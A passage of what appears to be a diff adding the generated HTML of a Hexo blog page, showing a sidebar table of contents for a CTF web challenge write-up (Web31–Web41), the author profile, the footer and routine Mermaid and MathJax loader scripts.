href="#%E4%BD%BF%E7%94%A8passthur%E7%BB%95%E8%BF%87system%EF%BC%8C%E4%BD%BF%E7%94%A8-%E4%BB%A3%E6%9B%BF%E5%8D%95%E4%B8%AA%E5%AD%97%E7%AC%A6%EF%BC%88%E5%AE%9E%E6%B5%8B%E4%B8%8D%E8%A1%8C%EF%BC%89"><span class="nav-number">1.2.3.0.1.</span> <span class="nav-text">使用passthur绕过system，使用 ? 代替单个字符（实测不行）</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E6%89%93%E5%8D%B0%E6%96%87%E4%BB%B6%E5%91%BD%E4%BB%A4%EF%BC%88%E5%8F%8D%E5%AD%97%E8%8A%82%E7%AC%A6%E9%85%8D%E5%90%88echo%EF%BC%89"><span class="nav-number">1.2.3.0.2.</span> <span class="nav-text">使用打印文件命令（反字节符配合echo）</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%8B%BC%E6%8E%A5%E6%B3%95%EF%BC%88%E6%84%9F%E8%A7%89%E4%B8%8D%E5%A6%82eval%E5%B5%8C%E5%A5%97%EF%BC%89"><span class="nav-number">1.2.3.0.3.</span> <span class="nav-text">拼接法（感觉不如eval嵌套）</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web31"><span class="nav-number">1.3.</span> <span class="nav-text">Web31</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE-2"><span class="nav-number">1.3.1.</span> <span class="nav-text">题目</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%87%A0%E7%A7%8D%E6%80%9D%E8%B7%AF-2"><span class="nav-number">1.3.2.</span> <span class="nav-text">几种思路</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8eval%E5%B5%8C%E5%A5%97"><span class="nav-number">1.3.2.0.1.</span> <span class="nav-text">使用eval嵌套</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E5%87%BD%E6%95%B0%E5%87%91%E5%87%BA%E6%89%80%E9%9C%80%E8%A6%81%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%9D%A5%E7%BB%95%E8%BF%87%EF%BC%88%E7%9B%90%E9%83%BD%E4%B8%8D%E7%9B%90%E4%BA%86%EF%BC%89"><span class="nav-number">1.3.2.0.2.</span> <span class="nav-text">其他函数凑出所需要的字符串来绕过（盐都不盐了）</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web32"><span class="nav-number">1.4.</span> <span class="nav-text">Web32</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE-3"><span class="nav-number">1.4.1.</span> <span class="nav-text">题目</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF"><span class="nav-number">1.4.2.</span> <span class="nav-text">思路</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web33"><span class="nav-number">1.5.</span> <span class="nav-text">Web33</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web34"><span class="nav-number">1.6.</span> <span class="nav-text">Web34</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web35"><span class="nav-number">1.7.</span> <span class="nav-text">Web35</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web36"><span class="nav-number">1.8.</span> <span class="nav-text">Web36</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web37"><span class="nav-number">1.9.</span> <span class="nav-text">Web37</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE-4"><span class="nav-number">1.9.1.</span> <span class="nav-text">题目</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90-2"><span class="nav-number">1.9.2.</span> <span class="nav-text">题目分析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web38"><span class="nav-number">1.10.</span> <span class="nav-text">Web38</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE-5"><span class="nav-number">1.10.1.</span> <span class="nav-text">题目</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web39"><span class="nav-number">1.11.</span> <span class="nav-text">Web39</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web40"><span class="nav-number">1.12.</span> <span class="nav-text">Web40</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE-6"><span class="nav-number">1.12.1.</span> <span class="nav-text">题目</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%81%9A%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="nav-number">1.12.2.</span> <span class="nav-text">做题思路</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web41"><span class="nav-number">1.13.</span> <span class="nav-text">Web41</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE-7"><span class="nav-number">1.13.1.</span> <span class="nav-text">题目</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC"><span class="nav-number">1.13.2.</span> <span class="nav-text">脚本</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Pocon</p>
+  <div class="site-description" itemprop="description">Pocon's personal blog about Computer Vision, CTF, Multimedia Forensics, Web Security, Pwn and Machine Learning.</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">42</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2026</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Pocon</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+    
+  <script src="/lib/anime.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+    
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+<script>
+const mermaidBlocks = document.querySelectorAll('pre.mermaid');
+if (mermaidBlocks.length) {
+  mermaidBlocks.forEach(block => {
+    block.querySelectorAll('.post-code-copy').forEach(button => button.remove());
+  });
+
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/mermaid@11.15.0/dist/mermaid.min.js', () => {
+    mermaid.initialize({
+      startOnLoad: false,
+      theme    : 'forest',
+      logLevel : 3,
+      flowchart: { curve     : 'linear' },
+      gantt    : { axisFormat: '%m/%d/%Y' },
+      sequence : { actorMargin: 50 }
+    });
+    if (mermaid.run) {
+      mermaid.run({ querySelector: 'pre.mermaid' });
+    } else {
+      mermaid.init(undefined, mermaidBlocks);
+    }
+  }, window.mermaid);
+}
+</script>
+
+
+  
+  
+
+  
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+          load: ['[tex]/mhchem'],
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+          packages: {'[+]': ['mhchem']},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
+
+  
+
+</body>
+</html>
